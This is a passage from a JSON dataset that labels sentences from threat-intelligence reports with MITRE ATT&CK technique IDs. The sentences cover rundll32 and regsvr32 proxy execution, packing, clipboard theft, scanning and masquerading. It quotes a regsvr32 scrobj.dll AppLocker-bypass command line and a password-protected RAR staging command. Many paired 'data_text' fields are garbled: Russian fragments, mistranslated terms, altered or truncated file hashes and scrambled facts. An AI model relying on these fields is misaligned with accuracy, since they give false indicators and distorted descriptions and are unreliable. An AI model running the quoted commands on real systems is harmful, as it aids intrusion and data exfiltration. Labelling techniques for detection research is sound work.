            "en_text": "FeedBack.php validates the sender by User-Agent, saves the data in the “RAR” server directory and stores the metadata in the mssql database for later reference",
            "data_text": "FeedBack.php verifies the sender by User-Agent, stores the data in the \"RAR\" server directory, and stores the metadata in the mssql database for later reference"
        }
    ],
    "Log.php validates the sender by User-Agent, saves the data in the “UP” server directory and stores the metadata in the mssql database for later reference": [
        {
            "tec_id": "T1074",
            "en_text": "Log.php validates the sender by User-Agent, saves the data in the “UP” server directory and stores the metadata in the mssql database for later reference",
            "data_text": "Log.php verifies the sender by User-Agent, stores the data in the \"UP\" server directory, and stores the metadata in the mssql database for later reference"
        }
    ],
    "Note: aswrundll.exe is very similar to Microsoft’s own rundll32.exe - it allows you to execute DLLs by calling their exported functions": [
        {
            "tec_id": "T1218.011",
            "en_text": "Note: aswrundll.exe is very similar to Microsoft’s own rundll32.exe - it allows you to execute DLLs by calling their exported functions",
            "data_text": "Note: aswrundll.exe is very similar to Microsoft roundll32.exe - this allows you to execute DLL functions that call their exported functions."
        }
    ],
    "On the next step this file is executed by rundll32.exe via the KlpSvc export": [
        {
            "tec_id": "T1218.011",
            "en_text": "On the next step this file is executed by rundll32.exe via the KlpSvc export",
            "data_text": "In the next step, this file is run roundll32.exe via KlpSvc export"
        }
    ],
    "The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\\Environment\\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed": [
        {
            "tec_id": "T1218.011",
            "en_text": "The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\\Environment\\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed",
            "data_text": "Dropper the two файла:netwf.bat, but netwf.dllnetwf.dll, useful нагрузкаДроппер the last 2 mechanism настойчивости:HKCU\\Экология\\UserInitMprLogonScript for the implementation of the netwf.bat fileCOM The object хиджак the next CLSID : {BCDE0395-E52F-467C-8E3D-C4579291692E}, CLSID of MMDeviceEnumerator.These 2 was also previously used this an actor.Finally, the load is rundll32.exe (and ординалом in argument) or исследователем.exe if the хиджак from Object."
        }
    ],
    "The loader component is executed via RUNDLL32.EXE": [
        {
            "tec_id": "T1218.011",
            "en_text": "The loader component is executed via RUNDLL32.EXE",
            "data_text": "The loader component is executed via RUNDLL32.The Axe"
        }
    ],
    "Then it checks to see if it was launched by RUNDLL32.exe along with parameter #1": [
        {
            "tec_id": "T1218.011",
            "en_text": "Then it checks to see if it was launched by RUNDLL32.exe along with parameter #1",
            "data_text": "It then checks if it was running RUNDLL32.exe along with parameter #1"
        }
    ],
    "If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe": [
        {
            "tec_id": "T1218.011",
            "en_text": "If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe",
            "data_text": "If this feature is successfully loaded, it will eventually create a new instance with the Rundll32Call export through the rundll32.exe call."
        }
    ],
    "If the string is present, the malware executes the command RunDll32.exe": [
        {
            "tec_id": "T1218.011",
            "en_text": "If the string is present, the malware executes the command RunDll32.exe",
            "data_text": "If a string is present, the malware executes the RunDll32.exe command."
        }
    ],
    "rundll32.exe": [],
    "It loads the module with parameter vShow set to zero, which opens the application with a hidden window.  Alternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe": [
        {
            "tec_id": "T1218.010",
            "en_text": "It loads the module with parameter vShow set to zero, which opens the application with a hidden window.  Alternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe",
            "data_text": "It loads the module with the vShow parameter set to zero, which opens the application with a hidden window. Otherwise, if Avast is not installed on the machine, the malicious module is loaded using regsvr32.exe."
        }
    ],
    "regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.    The script attempts to load the malicious module using regsvr with the run function.   Procmon shows the malicious module loaded to the Avast process": [
        {
            "tec_id": "T1218.010",
            "en_text": "regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.    The script attempts to load the malicious module using regsvr with the run function.   Procmon shows the malicious module loaded to the Avast process",
            "data_text": "regsvr32.exe is the native utility for registering and unregistering DLLs and ActiveX controls in the Windows registry. The script attempts to load the malicious module using the run regsvr feature. Procon shows a malicious module loaded into the Avast process"
        }
    ],
    "The malicious modules in regsvr32.exe memory After the Irdsnhrxxxfery98 module is loaded, the malware searches different processes to continue its malicious activity depending on the way Irdsnhrxxxfery64 was loaded": [
        {
            "tec_id": "T1218.010",
            "en_text": "The malicious modules in regsvr32.exe memory After the Irdsnhrxxxfery98 module is loaded, the malware searches different processes to continue its malicious activity depending on the way Irdsnhrxxxfery64 was loaded",
            "data_text": "After loading the Irdsnhrxxfery98 module, the malicious modules in the regsvr32.exe memory look for different processes to continue their malicious activity depending on how the Irdsnhrxfery64 was loaded"
        }
    ],
    "If Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:   It will target unins000.exe if it is available": [
        {
            "tec_id": "T1218.010",
            "en_text": "If Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:   It will target unins000.exe if it is available",
            "data_text": "If Irdsnhrxxfery64 is loaded using regsvr32.exe, it will target three processes: It will target unins000.exe if it is available"
        }
    ],
    "The Cybereason platform was able to detect the malicious injection, identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and module arqueiro.   The downloaded modules found in regsvr32.exe as detected by the Cybereason platform": [
        {
            "tec_id": "T1218.010",
            "en_text": "The Cybereason platform was able to detect the malicious injection, identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and module arqueiro.   The downloaded modules found in regsvr32.exe as detected by the Cybereason platform",
            "data_text": "The Cybereason platform was able to detect malicious injections by identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and the module arqueiro. Downloaded modules found in regsvr32.exe discovered by Cybereason platform"
        }
    ],
    "The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:       regsvr32.exe /s /n /u /i:%TEMP%\\12-B-366.txt scrobj.dll     The use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module": [],
    "After selecting a payload URL, the script will create copies of certutil and regsvr32 to the temp directory for later use": [
        {
            "tec_id": "T1218.010",
            "en_text": "After selecting a payload URL, the script will create copies of certutil and regsvr32 to the temp directory for later use",
            "data_text": "After selecting a payload URL, the script will create copies of certitil and regsvr32 to the temporary directory for later use."
        }
    ],
    "8 Making a copy of certutil and regsvr32 Certutil.exe (a copy is renamed to certis.exe by the trojan) is normally used in a windows environment to manage certificates, but in this case, it is used by the second stylesheet to download the malware payloads": [
        {
            "tec_id": "T1218.010",
            "en_text": "8 Making a copy of certutil and regsvr32 Certutil.exe (a copy is renamed to certis.exe by the trojan) is normally used in a windows environment to manage certificates, but in this case, it is used by the second stylesheet to download the malware payloads",
            "data_text": "8 Creating a copy of certitil and regsvr32 certutil.exe (copy renamed certis.exe to trojan) is typically used in a Windows environment to manage certificates, but in this case, it is used in the second stylist to download malicious software downloads"
        }
    ],
    "11 AV detection If there is no Avast install present, the script proceeds to the final .dll execution using regsvr32 and quits": [
        {
            "tec_id": "T1218.010",
            "en_text": "11 AV detection If there is no Avast install present, the script proceeds to the final .dll execution using regsvr32 and quits",
            "data_text": "11 AV detection If there is no Avast installation, the script proceeds to the final execution of .dll using regsvr32 and exits"
        }
    ],
    "19-1 regsvr32 running the .dlls  Fig": [
        {
            "tec_id": "T1218.010",
            "en_text": "19-1 regsvr32 running the .dlls  Fig",
            "data_text": "19-1 regsvr32 runs .dlls Fig"
        }
    ],
    "regsvr32.exe": [],
    "After unpacking the module, it is packed with an additional inner packer Pe123\\RPolyCryptor": [
        {
            "tec_id": "T1027.002",
            "en_text": "After unpacking the module, it is packed with an additional inner packer Pe123\\RPolyCryptor",
            "data_text": "After unloading the module, it is packaged with an additional internal Pe123\\RPoli Cryptor package"
        }
    ],
    "BlackEnergy2 was eventually seen downloading more crimeware plugins – a custom spam plugin and a banking information stealer custom plugin": [
        {
            "tec_id": "T1027.002",
            "en_text": "BlackEnergy2 was eventually seen downloading more crimeware plugins – a custom spam plugin and a banking information stealer custom plugin",
            "data_text": "BlackEnergy2 was eventually seen loading more criminalization plugins – custom spam plugin and bank theft information custom plugin"
        }
    ],
    "It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind": [
        {
            "tec_id": "T1027.002",
            "en_text": "It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind",
            "data_text": "It should be noted that in most cases the back door has been built into a packaged payload into another executable file or into some armed document file."
        }
    ],
    "Flash object in the .docx file, stored in uncompressed format The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits": [
        {
            "tec_id": "T1027.002",
            "en_text": "Flash object in the .docx file, stored in uncompressed format The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits",
            "data_text": "Flash object in a .docx file stored in a non-compressor format. Flash object contains ActionScript, which is responsible for extracting the operation using a custom packer, which is seen in other FinSpy operations."
        }
    ],
    "The PCODE of the virtual machine is packed with the aplib packer": [
        {
            "tec_id": "T1027.002",
            "en_text": "The PCODE of the virtual machine is packed with the aplib packer",
            "data_text": "The virtual machine's PCODE is packaged with aplib packer"
        }
    ],
    "An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed": [
        {
            "tec_id": "T1027.002",
            "en_text": "An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed",
            "data_text": "Interestingly, all of the Delphi loaded onto these shipments were packed UPX, and none of the other loaded loads were packed."
        }
    ],
    "While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed": [
        {
            "tec_id": "T1027.002",
            "en_text": "While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed",
            "data_text": "Although we can only speculate for a specific reason, this is probably Sofacy packaged only Delphi variants in an attempt to increase avoidance as Delphi variant Zebrocy is known and has been extensively analyzed"
        }
    ],
    "The MSIL file contains the packed core payload in its .Net resource section": [
        {
            "tec_id": "T1027.002",
            "en_text": "The MSIL file contains the packed core payload in its .Net resource section",
            "data_text": "The MSIL file contains the packaged payload kernel.Clean Resources Section"
        }
    ],
    "Obfuscation While the downloader module is not packed, the backdoor is packed with a modified version of UPX": [
        {
            "tec_id": "T1027.002",
            "en_text": "Obfuscation While the downloader module is not packed, the backdoor is packed with a modified version of UPX",
            "data_text": "Error While the download module is not packaged, the rear door is packed with a modified version of UPX"
        }
    ],
    "Two modifications are made to UPX version 3.91:  The magic bytes UPX! in the UPX header are replaced with ASS7, The decompressed code and strings sections are XORed with 0x01": [
        {
            "tec_id": "T1027.002",
            "en_text": "Two modifications are made to UPX version 3.91:  The magic bytes UPX! in the UPX header are replaced with ASS7, The decompressed code and strings sections are XORed with 0x01",
            "data_text": "UPX version 3.91 has two modifications: Magic Bytes UPX! in UPX header replaced by ASS7, Decompressed Code Section and XORed 0x01 strings"
        }
    ],
    "Figure 6: Difference between a stock UPX packed file and the modified one A patch for UPX is available on ESET’s malware-research Github repository that allows unpacking Keydnap’s backdoor with the usual upx -d": [
        {
            "tec_id": "T1027.002",
            "en_text": "Figure 6: Difference between a stock UPX packed file and the modified one A patch for UPX is available on ESET’s malware-research Github repository that allows unpacking Keydnap’s backdoor with the usual upx -d",
            "data_text": "Figure 6: The difference between the stock of the packaged UPX file and the modified patch for UPX is available in the Github repository, which allows you to unpack the Keydnap backdoor with the normal upx -d"
        }
    ],
    "See the following for more information and examples of false flags being used in cyberattacks: Wave your false flags! …or the Nightmares and Nuances of a Self-Aware Attribution Space OlympicDestroyer is here to trick the industry Malware description The malware was first seen packed with VMProtect; when unpacked the sample didn’t show any similarities with previously known malware": [
        {
            "tec_id": "T1027.002",
            "en_text": "See the following for more information and examples of false flags being used in cyberattacks: Wave your false flags! …or the Nightmares and Nuances of a Self-Aware Attribution Space OlympicDestroyer is here to trick the industry Malware description The malware was first seen packed with VMProtect; when unpacked the sample didn’t show any similarities with previously known malware",
            "data_text": "See the following information and examples of flag usage in cyberattacks: Raise flags! …or the nightmares and nuances of OlympicDestroyer's self-sufficient space here to deceive the description of the Malware industry. Malware was first seen packaged by VMProtect; when the unpacked sample showed no similarities to previously known malware"
        }
    ],
    "Can be packed into a single .py file and run without any dependencies other than the python standard library on all OSes": [
        {
            "tec_id": "T1027.002",
            "en_text": "Can be packed into a single .py file and run without any dependencies other than the python standard library on all OSes",
            "data_text": "Can be packaged into a single .py file and run without any dependencies other than the standard python library on all OSs"
        }
    ],
    "(Source: Dell SecureWorks) In SWCs analyzed by CTU researchers, the threat actors added the Dean Edwards packed JavaScript code shown in Figure 9 to the end of a legitimate website's menu page": [
        {
            "tec_id": "T1027.002",
            "en_text": "(Source: Dell SecureWorks) In SWCs analyzed by CTU researchers, the threat actors added the Dean Edwards packed JavaScript code shown in Figure 9 to the end of a legitimate website's menu page",
            "data_text": "(Source: In SWC analyzed by CTU researchers, threat actors added a code packaged by Dean Edwards shown in Figure 9 at the end of the menu page of the legitimate website."
        }
    ],
    "First, the sample is UPX packed": [
        {
            "tec_id": "T1027.002",
            "en_text": "First, the sample is UPX packed",
            "data_text": "First, the sample is packaged on UPX"
        }
    ],
    "Data Exfiltration The second module Irdsnhrxxxfery98.~ is responsible for a vast amount of information stealing, and is able to collect information through hooking, clipboard usage, and monitoring the keystate": [
        {
            "tec_id": "T1115",
            "en_text": "Data Exfiltration The second module Irdsnhrxxxfery98.~ is responsible for a vast amount of information stealing, and is able to collect information through hooking, clipboard usage, and monitoring the keystate",
            "data_text": "2. Irdsnhrxxxfery98.~ module is responsible for a huge amount of information theft, and is able to collect information through hooks, use clipboard and monitor key status"
        }
    ],
    "Cadelspy’s main payload contains its back door functionality, allowing the threat to carry out the following activities:  Log keystrokes and the titles of open windows Gather clipboard data and system information Steal printer information and any documents that were sent to be printed Record audio Capture screenshots and webcam photos  Cadelspy compresses all of the stolen data into a .cab file and uploads it to the attacker’s C&C servers": [
        {
            "tec_id": "T1115",
            "en_text": "Cadelspy’s main payload contains its back door functionality, allowing the threat to carry out the following activities:  Log keystrokes and the titles of open windows Gather clipboard data and system information Steal printer information and any documents that were sent to be printed Record audio Capture screenshots and webcam photos  Cadelspy compresses all of the stolen data into a .cab file and uploads it to the attacker’s C&C servers",
            "data_text": "The main useful load Кадельспи includes function the back door, which allows threats to the following actions : The keys of the open windows Сбор the clipboard and System Information Abduction of information, printers and any documents that were sent for printing Recording audio Capture of and a webcam photo Кадельспи is all the stolen data to file. Vincent and uploads them to the attacker's"
        }
    ],
    "Clipboard stealer ": [
        {
            "tec_id": "T1115",
            "en_text": "Clipboard stealer ",
            "data_text": "Shorter masking"
        }
    ],
    "OpenClipboard()  ": [
        {
            "tec_id": "T1115",
            "en_text": "OpenClipboard()  ",
            "data_text": "OpenClipboard()"
        }
    ],
    " GetClipboardData() ": [
        {
            "tec_id": "T1115",
            "en_text": " GetClipboardData() ",
            "data_text": "GetClipboardData()"
        }
    ],
    " pbpaste ": [
        {
            "tec_id": "T1115",
            "en_text": " pbpaste ",
            "data_text": "pbpaste"
        }
    ],
    " OnDrawClipboard": [
        {
            "tec_id": "T1115",
            "en_text": " OnDrawClipboard",
            "data_text": "OnDrawClipboard"
        }
    ],
    "Those assignments were not likely arbitrary, as this group had developed BlackEnergy2 for several years in a professional and organized style:  Config with a similar set of plugins for different architectures Here is the list of retrieved files and related functionality:    weap DDoS Attack (various types)   ps password stealer handling a variety of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet)   nm scans ports, stores banners   snif logs IP source and destination, TCP/UDP ports   hook main module: CnC communication, config parser, plugins loader   uper rewrites hook module with a new version and launches it     Weap, Snif, Nm plugin grammar mistakes and mis-spellings The developers’ coding style differed across the ‘Hook’ main module, the plugins, and the Windows main.dll": [
        {
            "tec_id": "T1046",
            "en_text": "Those assignments were not likely arbitrary, as this group had developed BlackEnergy2 for several years in a professional and organized style:  Config with a similar set of plugins for different architectures Here is the list of retrieved files and related functionality:    weap DDoS Attack (various types)   ps password stealer handling a variety of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet)   nm scans ports, stores banners   snif logs IP source and destination, TCP/UDP ports   hook main module: CnC communication, config parser, plugins loader   uper rewrites hook module with a new version and launches it     Weap, Snif, Nm plugin grammar mistakes and mis-spellings The developers’ coding style differed across the ‘Hook’ main module, the plugins, and the Windows main.dll",
            "data_text": "These tasks were not arbitrary, as this group developed BlackEnergy2 in a professional and organized style. Config to the same set of plugins for various architectures - This is the list of lessons learned and related functions : Runs DDoS Attack (different types of) ps кражщик the codes by various of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet) nm can scan ports and banners, magazines IP-источник and destination, TCP/UDP the ports and the main module : CnC, in configuration. plugin loader rewrites the hook module with the new version and launches its weapon, Snif, Nm plugin grammatical errors and incorrect expressions DeveloperS' encoding style differed between the main module 'Hook', plugins and Windows main.dll"
        }
    ],
    "Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the same internal and external subnet mask (i.e 255.255.0.0\\16)": [
        {
            "tec_id": "T1046",
            "en_text": "Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the same internal and external subnet mask (i.e 255.255.0.0\\16)",
            "data_text": "Check the network environment of the infected machine; check for specific ports on servers sharing the same internal and external subnet mask (that is, 255).255.0.0\\16)"
        }
    ],
    "Mimikatz The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in commonly exploited by EternalBlue to move laterally to other systems on the network.": [
        {
            "tec_id": "T1046",
            "en_text": "Mimikatz The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in commonly exploited by EternalBlue to move laterally to other systems on the network.",
            "data_text": "Mimikatz Threat Actors have also downloaded tools to scan and exploit potential vulnerabilities in the network, such as a known SMB vulnerability fixed in a widely exploited EternalBlue to transfer to other network systems."
        }
    ],
    "What changes in the code can we see in such short time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not": [
        {
            "tec_id": "T1036",
            "en_text": "What changes in the code can we see in such short time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not",
            "data_text": "What code changes can be seen in such short intervals of time that would not be presented in the build tool? In one case, one build was programmed to execute the runmem command for the wi.exe file, while the other was not executed."
        }
    ],
    "This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat": [
        {
            "tec_id": "T1036",
            "en_text": "This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat",
            "data_text": "This corresponds to most enemies motivated by espionage, because once an opponent gains access through legitimate credentials, they can disguise themselves as a legitimate user and, in effect, become a threat to the insider."
        }
    ],
    "Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta    nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35    rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0    Table 5": [
        {
            "tec_id": "T1036",
            "en_text": "Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta    nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35    rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0    Table 5",
            "data_text": "File name SHA256 Description 7za.exe dd6d7af00ef4ca89a319a230cd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta nbt.exe c9d5dc956841e000bfd8767b795b79e"
        }
    ],
    "Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta   hb.exe 3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62 Hobocopy   nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35   rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0   tardigrade.exe fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a98875392 Tardigrade application": [],
    "CTU researchers identified BRONZE UNION actors using a file named ms.exe that was likely a credential-abuse tool from the Kekeo toolset": [
        {
            "tec_id": "T1036",
            "en_text": "CTU researchers identified BRONZE UNION actors using a file named ms.exe that was likely a credential-abuse tool from the Kekeo toolset",
            "data_text": "CTU researchers identified BRONZE UNION actors using the ms.exe file, which was probably a tool for abusing trust authority from Kekeo's toolkit."
        }
    ],
    "In one instance, the threat actor gained remote access to a high-value system in a compromised network, ran quser.exe to identify existing RDP sessions on the device, immediately ran a command to compile a RAR archive that specified file types the threat actor did not want, and used a password to encrypt the archive:  YYYY-MM-DD hh:mm:ss     quser YYYY-MM-DD hh:mm:ss     C:\\windows\\temp\\svchost.exe a -m5 -v2000m -hp{password} -inul -r \"{destination_file.rar}\" \"{multiple user directories linked to the victim's projects}\" -x*.exe -x*.msi -x*.cab -x*.inc -x*.dll -x*.db -x*.mdb -x*.htm -x*.html -x*.css -x*.jar -x*.js -x*.tmp -x*.bak -x*.dat -x*.log -x*.xml -x*.dmp -x*.dbf -x*.avi -x*.mp3 -x*.mp4 -x*.mpg -x*.mpeg -x*.asp -x*.aspx -x*.gif -x*.jpg -x*.mpp -x*.pst  The threat actors typically rename the encrypted RAR archives": [
        {
            "tec_id": "T1036",
            "en_text": "In one instance, the threat actor gained remote access to a high-value system in a compromised network, ran quser.exe to identify existing RDP sessions on the device, immediately ran a command to compile a RAR archive that specified file types the threat actor did not want, and used a password to encrypt the archive:  YYYY-MM-DD hh:mm:ss     quser YYYY-MM-DD hh:mm:ss     C:\\windows\\temp\\svchost.exe a -m5 -v2000m -hp{password} -inul -r \"{destination_file.rar}\" \"{multiple user directories linked to the victim's projects}\" -x*.exe -x*.msi -x*.cab -x*.inc -x*.dll -x*.db -x*.mdb -x*.htm -x*.html -x*.css -x*.jar -x*.js -x*.tmp -x*.bak -x*.dat -x*.log -x*.xml -x*.dmp -x*.dbf -x*.avi -x*.mp3 -x*.mp4 -x*.mpg -x*.mpeg -x*.asp -x*.aspx -x*.gif -x*.jpg -x*.mpp -x*.pst  The threat actors typically rename the encrypted RAR archives",
            "data_text": "In one case, the actor received for remote access to the high cost of the system \" Network, quser.историческое the RDP sessions on the device, immediately ran the team to draw up, the RAR archive the types of files is a threat to the actor didn't want to, and used a password to encrypt the file : YYYY-MM-DD hh:mm:ss quser : YYYY-MM-DD hh:mm:ss C:\\windows\\temp\\svchost.exe - m5. - v2000m - hp {password} - inul - r \"{ destination_file.rar.\". \"{ a few user directories with the victim of the draft}\" - x*.exe - x*.msi - x*.cab - x*.inc - x*.dll - x*.db - x*.mdb - x*.htm - x*.html - x*.css - x*.jar - x*.js - x*.tmp - x*.bak - x*.dat - x*.log - x*.xml - x*.dmp - x*.dbf - x*.avi - x*.mp3 - x*.mp4 - x*.mpg - x*.mpeg - x*.asp - x*.aspx - x*.gif - x*.jpg - x*.mpp - x*.pst Угроза. subjects are usually you in encryption.ZIP archives"
        }
    ],
    "SHA256  a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff   MD5 1ff40e79d673461cd33bd8b68f8bb5b8   Compiled 2017.08.06 11:32:36 (GMT), 2.22   Type I386 Windows Console EXE   Size 101 888    Instead of implementing this auxiliary module in the form of a dynamic linked library with its corresponding exported functions, the developers decided to use a standalone executable started by events.exe with the following parameters:    Parameter Description   -scr Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration": [
        {
            "tec_id": "T1036",
            "en_text": "SHA256  a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff   MD5 1ff40e79d673461cd33bd8b68f8bb5b8   Compiled 2017.08.06 11:32:36 (GMT), 2.22   Type I386 Windows Console EXE   Size 101 888    Instead of implementing this auxiliary module in the form of a dynamic linked library with its corresponding exported functions, the developers decided to use a standalone executable started by events.exe with the following parameters:    Parameter Description   -scr Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration",
            "data_text": "Instead, in the form of dynamic module EX388d3ff the MD5 1ff40e79d673461cd33bd8b68f8bbb5b8 Компилированный 2017.08.06 11:32:36 (GMT), 2.22 The dynamic module EX388d3ff the MD5 1ff40e79d673461cd33bbbbc8f8bbbb8 Компилированный 2017.08.06 11:32:36 (GMT), in the form of I386x101xx101xxxx101xxxxxxxxxxxxвыбрано to use a single executable, событиями.exe with the following parameters : Опис.The -scr option specifies the name of the screen file to be saved in the Cache006 subdirectory, which is password-stamped from the configuration."
        }
    ],
    "The file is named netwf.dat": [
        {
            "tec_id": "T1036",
            "en_text": "The file is named netwf.dat",
            "data_text": "A file called netwf.dat"
        }
    ],
    "For example, APT32 installed one backdoor as a persistent service with a legitimate service name that had a Unicode no-break space character appended to it": [
        {
            "tec_id": "T1036",
            "en_text": "For example, APT32 installed one backdoor as a persistent service with a legitimate service name that had a Unicode no-break space character appended to it",
            "data_text": "For example, APT32 installed a single door as a permanent service with a legitimate service name in which the Unicode symbol was attached without space interruption."
        }
    ],
    "The account names visually look similar to legitimate government organization names or other trusted third-party entities": [
        {
            "tec_id": "T1036",
            "en_text": "The account names visually look similar to legitimate government organization names or other trusted third-party entities",
            "data_text": "Account names are visually similar to the names of legitimate government organizations or other trusted parties"
        }
    ],
    "The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload": [
        {
            "tec_id": "T1036",
            "en_text": "The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload",
            "data_text": "The initial overlay was based on the wmssl.exe file, which was seen as the executable name that Cannon would move the wmssl.txt attachment to install and run the secondary payload"
        }
    ],
    "Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension   3": [
        {
            "tec_id": "T1036",
            "en_text": "Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension   3",
            "data_text": "Write executable files to a randomly selected directory in the Program Files section, and the EXE name to match the name of the selected directory, or, if this fails, write the executable file to the system temporary name using the EXE 3 extension."
        }
    ],
    "The malware drops the Windows batch file dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program": [
        {
            "tec_id": "T1036",
            "en_text": "The malware drops the Windows batch file dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program",
            "data_text": "Malware deletes Windows package file dx.bat that tries to kill task daumcleaner.exe; Korean security program"
        }
    ],
    "Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity": [
        {
            "tec_id": "T1036",
            "en_text": "Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity",
            "data_text": "Bankshot implants are distributed from a domain with a name similar to that of a platform for lending Falcon Coin cryptocurrency, but a similar domain name is not related to a legitimate person"
        }
    ],
    "The “VPN Client” is a legitimate Juniper VPN software bundled with Helminth,  a malware in use by the OilRig threat agnet: JuniperSetupClientInstaller.exe 6a65d762fb548d2dc56cfde4842a4d3c (VirusTotal link) If the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed": [
        {
            "tec_id": "T1036",
            "en_text": "The “VPN Client” is a legitimate Juniper VPN software bundled with Helminth,  a malware in use by the OilRig threat agnet: JuniperSetupClientInstaller.exe 6a65d762fb548d2dc56cfde4842a4d3c (VirusTotal link) If the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed",
            "data_text": "\"VPN Client\" is the legal Juniper VPN software that is part of Helminth, the malware used by the OilRig threat agent: JuniperSetupClientInstaller.exe 6a65d762fb548dc56cfde4842a4d3c (VirusTotal link) If the victim downloads and installs a VPN file, the computer will be infected."
        }
    ],
    "For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to “%TEMP%\\flash_update.exe” that was a legitimate Flash Player installer": [
        {
            "tec_id": "T1036",
